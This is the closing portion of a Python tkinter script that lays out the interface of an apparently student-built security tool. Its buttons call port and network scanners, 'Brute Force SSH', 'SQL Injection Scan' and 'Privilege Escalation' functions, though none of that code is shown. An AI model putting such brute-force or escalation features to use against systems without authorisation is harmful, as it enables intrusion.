entry_ip = tk.Entry(input_frame, font=default_font, relief=tk.SOLID, borderwidth=1, width=40) # Width relative to frame now
entry_ip.pack(pady=5, ipady=3, fill=tk.X, expand=True) # Fill available width

# --- Button Section ---
button_frame = tk.Frame(main_frame, bg='#F5F5F5')
button_frame.pack(pady=10, anchor="center")

# Button Definitions & Layout
buttons_data = [
    ("Scan Ports", threaded_scan_ports, '#4CAF50'), # Green
    ("Brute Force SSH", threaded_brute_force_ssh, '#F44336'), # Red
    ("SQL Injection Scan", threaded_sql_injection_scan, '#FF9800'), # Orange
    ("Privilege Escalation", privilege_escalation, '#2196F3'), # Blue
    ("Network Scanner", threaded_network_scanner, '#673AB7'), # Purple
    ("Vuln Scanner", basic_vulnerability_scanner, '#E91E63'), # Pink
    ("Password Strength", password_strength_checker, '#009688'), # Teal
    ("Web App Scanner", web_application_scanner, '#3F51B5'), # Indigo
    ("Export Results", export_results, '#8BC34A'), # Light Green
    ("Stop Scanning", stop_scanning, '#FF5722'), # Deep Orange
    ("Clear Results", clean_results, '#9E9E9E'), # Gray
    ("Help", show_help, '#607D8B') # Blue Gray
]

row, col = 0, 0
button_width = 18 # Consistent width
for text, command, bg_color in buttons_data:
    button = tk.Button(button_frame, text=text, command=command, bg=bg_color, fg='white',
                    width=button_width, font=bold_font, relief=tk.RAISED, borderwidth=1, padx=5, pady=3)
    button.grid(row=row, column=col, padx=5, pady=5, sticky="ew")
    button_list.append(button)
    default_button_colors.append(bg_color)
    col += 1
    if col > 2:
        col = 0
        row += 1

# Active button color for day mode
active_button_bg = '#C8E6C9'

# Toggle Theme Button
theme_button = tk.Button(button_frame, text="Switch to Night Mode", command=toggle_theme,
                        bg='#DDDDDD', fg='black', font=bold_font, width=button_width, relief=tk.RAISED, borderwidth=1, padx=5, pady=3)
theme_button.grid(row=row, column=0, columnspan=3, padx=5, pady=10, sticky="ew") # Place below

# --- Credit Label ---
credit_label = tk.Label(main_frame,
                        text="Credit: MMDC IT Students: Orcullo, Claros C., Diaz, David Algerico, Mercado, Jan Thadeus & Enhance by GEMINI 2.5",
                        font=credit_font, bg='#F5F5F5', fg='#555555', justify=tk.LEFT)
# Pack at the bottom of the main_frame, after buttons
credit_label.pack(side=tk.BOTTOM, pady=(10, 5), anchor='w', padx=10)

# --- Results Box (Right Panel) ---
result_box = scrolledtext.ScrolledText(content_frame, width=80, height=30, bg='#FFFFFF', fg='#333333',
                                    font=result_font, relief=tk.SUNKEN, borderwidth=1, wrap=tk.WORD)
result_box.grid(row=0, column=1, sticky="nsew", padx=(5, 0), pady=0) # Stick all sides
result_box.config(state=tk.DISABLED)

# Configure tags for result box coloring
result_box.tag_config('open', foreground='#008D00', font=(result_font.cget("family"), result_font.cget("size"), "bold")) # Darker Green
result_box.tag_config('closed', foreground='#D32F2F') # Darker Red
result_box.tag_config('error', foreground='#E65100', font=(result_font.cget("family"), result_font.cget("size"), "bold")) # Dark Orange/Red
result_box.tag_config('stopped', foreground='#1976D2', font=(result_font.cget("family"), result_font.cget("size"), "italic")) # Darker Blue
result_box.tag_config('info', foreground='#0277BD') # Slightly different blue for info
result_box.tag_config('info_faint', foreground='gray55')

# --- Start GUI ---
# Set initial theme correctly if needed (optional, defaults to day)
# toggle_theme() # Call once if you want it to start in night mode
# toggle_theme() # Call again to set day mode colors correctly initially

root.mainloop()



# --- Multi-Function Security Tool Manual ---
# --- Copy the Link and Paste to your Browser ---
# --- https://docs.google.com/document/d/1vv0v8y4uAkgrIG1sx2kPm0p4Olacv4-_AIfATDLV1sI/edit?usp=sharing -----



